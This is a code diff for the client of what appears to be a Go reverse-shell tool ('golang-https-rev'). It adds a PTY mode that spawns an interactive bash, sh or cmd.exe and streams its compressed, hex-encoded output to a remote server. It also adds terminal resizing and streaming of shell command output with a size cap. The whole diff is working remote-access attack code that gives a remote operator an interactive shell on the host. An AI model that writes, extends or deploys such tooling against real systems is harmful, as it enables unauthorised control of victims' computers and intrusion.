@@ -2,12 +2,17 @@ package client
 
 import (
 	"fmt"
+	"io"
 	"log"
 	"os"
 	"os/exec"
 	"runtime"
+	"strconv"
 	"strings"
+	"syscall"
+	"unsafe"
 
+	"github.com/creack/pty"
 	"golang-https-rev/pkg/compression"
 	"golang-https-rev/pkg/protocol"
 )
@@ -125,6 +130,170 @@ func (rc *ReverseClient) handleExitCommand() error {
 	return nil // Signal to return from main loop
 }
 
+// handlePtyModeCommand enters PTY mode and spawns an interactive shell
+func (rc *ReverseClient) handlePtyModeCommand() error {
+	if rc.inPtyMode {
+		rc.writer.WriteString("Already in PTY mode\n" + protocol.EndOfOutputMarker + "\n")
+		return rc.writer.Flush()
+	}
+
+	// Determine shell
+	shell := "/bin/bash"
+	if runtime.GOOS == "windows" {
+		shell = "cmd.exe"
+	} else if _, err := os.Stat(shell); os.IsNotExist(err) {
+		shell = "/bin/sh"
+	}
+
+	// Start shell in PTY
+	cmd := exec.Command(shell)
+	ptmx, err := pty.Start(cmd)
+	if err != nil {
+		rc.writer.WriteString(fmt.Sprintf("Failed to start PTY: %v\n", err) + protocol.EndOfOutputMarker + "\n")
+		return rc.writer.Flush()
+	}
+
+	rc.ptyFile = ptmx
+	rc.ptyCmd = cmd
+	rc.inPtyMode = true
+
+	// Send confirmation
+	rc.writer.WriteString("OK\n" + protocol.EndOfOutputMarker + "\n")
+	if err := rc.writer.Flush(); err != nil {
+		return err
+	}
+
+	// Capture the current ptmx for the goroutine so it doesn't use a stale reference
+	currentPtyFile := ptmx
+
+	// Start goroutine to forward PTY output to server
+	go func() {
+		buf := make([]byte, 4096)
+		for {
+			// Check if we've exited PTY mode or switched to a different PTY
+			if !rc.inPtyMode || rc.ptyFile != currentPtyFile {
+				break
+			}
+			
+			n, err := currentPtyFile.Read(buf)
+			if err != nil {
+				if err != io.EOF {
+					log.Printf("PTY read error: %v", err)
+				}
+				break
+			}
+			if n > 0 {
+				// Double-check we're still in the same PTY session
+				if !rc.inPtyMode || rc.ptyFile != currentPtyFile {
+					break
+				}
+				// Compress and encode PTY data as hex
+				encoded, err := compression.CompressToHex(buf[:n])
+				if err != nil {
+					log.Printf("Error encoding PTY data: %v", err)
+					continue
+				}
+				rc.writer.WriteString(protocol.CmdPtyData + " " + encoded + "\n")
+				rc.writer.Flush()
+			}
+		}
+		// PTY closed, exit PTY mode
+		rc.inPtyMode = false
+		rc.ptyFile = nil
+		rc.ptyCmd = nil
+		rc.writer.WriteString(protocol.CmdPtyExit + "\n")
+		rc.writer.Flush()
+	}()
+
+	return nil
+}
+
+// handlePtyDataCommand forwards data to the PTY
+func (rc *ReverseClient) handlePtyDataCommand(command string) error {
+	if !rc.inPtyMode || rc.ptyFile == nil {
+		return fmt.Errorf("not in PTY mode")
+	}
+
+	encoded := strings.TrimPrefix(command, protocol.CmdPtyData+" ")
+	// Decompress hex data
+	data, err := compression.DecompressHex(encoded)
+	if err != nil {
+		return fmt.Errorf("failed to decompress PTY data: %v", err)
+	}
+	_, err = rc.ptyFile.Write(data)
+	return err
+}
+
+// handlePtyResizeCommand handles window resize for PTY
+func (rc *ReverseClient) handlePtyResizeCommand(command string) error {
+	if !rc.inPtyMode || rc.ptyFile == nil {
+		return fmt.Errorf("not in PTY mode")
+	}
+
+	parts := strings.Fields(command)
+	if len(parts) != 3 {
+		return fmt.Errorf("invalid resize command: %s", command)
+	}
+
+	rows, err := strconv.Atoi(parts[1])
+	if err != nil {
+		return fmt.Errorf("invalid rows: %v", err)
+	}
+
+	cols, err := strconv.Atoi(parts[2])
+	if err != nil {
+		return fmt.Errorf("invalid cols: %v", err)
+	}
+
+	// Set window size
+	ws := &winsize{
+		Row: uint16(rows),
+		Col: uint16(cols),
+	}
+	_, _, errno := syscall.Syscall(
+		syscall.SYS_IOCTL,
+		uintptr(rc.ptyFile.Fd()),
+		uintptr(syscall.TIOCSWINSZ),
+		uintptr(unsafe.Pointer(ws)),
+	)
+	if errno != 0 {
+		return fmt.Errorf("ioctl TIOCSWINSZ failed: %v", errno)
+	}
+
+	return nil
+}
+
+// handlePtyExitCommand exits PTY mode
+func (rc *ReverseClient) handlePtyExitCommand() error {
+	if !rc.inPtyMode {
+		return nil
+	}
+
+	rc.inPtyMode = false
+
+	if rc.ptyCmd != nil && rc.ptyCmd.Process != nil {
+		rc.ptyCmd.Process.Kill()
+	}
+
+	if rc.ptyFile != nil {
+		rc.ptyFile.Close()
+		rc.ptyFile = nil
+	}
+
+	rc.ptyCmd = nil
+
+	rc.writer.WriteString("Exited PTY mode\n" + protocol.EndOfOutputMarker + "\n")
+	return rc.writer.Flush()
+}
+
+// winsize struct for PTY window size
+type winsize struct {
+	Row uint16
+	Col uint16
+	X   uint16
+	Y   uint16
+}
+
 // handleShellCommand executes a shell command and returns output
 func (rc *ReverseClient) handleShellCommand(command string) error {
 	var cmd *exec.Cmd
@@ -135,11 +304,53 @@ func (rc *ReverseClient) handleShellCommand(command string) error {
 		cmd = exec.Command("bash", "-c", command)
 	}
 
-	output, err := cmd.CombinedOutput()
+	// Store reference to running command for cancellation
+	rc.runningCmd = cmd
+	defer func() { rc.runningCmd = nil }()
+
+	// Stream output with size limit to handle long-running commands
+	maxLen := protocol.MaxBufferSize
+	output := make([]byte, 0, 8192)
+	truncated := false
+
+	pipe, err := cmd.StdoutPipe()
 	if err != nil {
-		// Log error but send output anyway
-		log.Printf("Command execution error: %v", err)
+		rc.writer.WriteString(fmt.Sprintf("Error creating pipe: %v\n", err) + protocol.EndOfOutputMarker + "\n")
+		return rc.writer.Flush()
 	}
+	cmd.Stderr = cmd.Stdout
+
+	if err := cmd.Start(); err != nil {
+		rc.writer.WriteString(fmt.Sprintf("Error starting command: %v\n", err) + protocol.EndOfOutputMarker + "\n")
+		return rc.writer.Flush()
+	}
+
+	// Read output up to maxLen
+	buf := make([]byte, 4096)
+	for len(output) < maxLen {
+		n, readErr := pipe.Read(buf)
+		if n > 0 {
+			remaining := maxLen - len(output)
+			if n > remaining {
+				output = append(output, buf[:remaining]...)
+				truncated = true
+				break
+			}
+			output = append(output, buf[:n]...)
+		}
+		if readErr != nil {
+			break
+		}
+	}
+
+	// If truncated, kill the process to avoid blocking on cmd.Wait()
+	if truncated {
+		cmd.Process.Kill()
+		output = append(output, []byte("\n...output truncated\n")...)
+	}
+
+	// Wait for command to finish
+	cmd.Wait()
 
 	rc.writer.WriteString(string(output) + protocol.EndOfOutputMarker + "\n")
 	return rc.writer.Flush()
@@ -161,6 +372,23 @@ func (rc *ReverseClient) processCommand(command string) (shouldContinue bool, er
 
 	if command == protocol.CmdExit {
 		return false, rc.handleExitCommand()
+	}
+
+	// Handle PTY mode commands
+	if command == protocol.CmdPtyMode {
+		return true, rc.handlePtyModeCommand()
+	}
+
+	if strings.HasPrefix(command, protocol.CmdPtyData+" ") {
+		return true, rc.handlePtyDataCommand(command)
+	}
+
+	if strings.HasPrefix(command, protocol.CmdPtyResize+" ") {
+		return true, rc.handlePtyResizeCommand(command)
+	}
+
+	if command == protocol.CmdPtyExit {
+		return true, rc.handlePtyExitCommand()
 	}
 
 	// Handle file transfers
